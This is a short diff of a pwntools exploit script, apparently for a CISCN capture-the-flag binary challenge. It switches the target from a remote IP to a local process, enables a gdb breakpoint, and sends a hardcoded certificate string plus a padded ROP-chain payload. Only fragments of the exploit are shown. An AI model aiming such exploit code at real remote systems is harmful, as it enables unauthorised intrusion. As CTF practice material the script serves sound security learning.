@@ -1,7 +1,7 @@
 from pwn import *
 context.log_level="debug"
-# sh=process("./pwn")
-sh=remote("123.56.135.185",17313)
+sh=process("./pwn")
+# sh=remote("123.56.135.185",17313)
 cert=b'cert nAcDsMicN S33UAga1n@#!'
 sh.sendlineafter(b"ciscnshell$ ", cert)
 
@@ -25,7 +25,7 @@ for i in range(r):
 payload+=b' '+b'a'*y
 payload+=b' '+b'+'*38
 payload+=b' '+ropchan
-# gdb.attach(sh,"b *0x4C1882\nc")
+gdb.attach(sh,"b *0x4C1882\nc")
 sh.sendlineafter(b"nightingale# ", payload)
 # input()
 sleep(1)
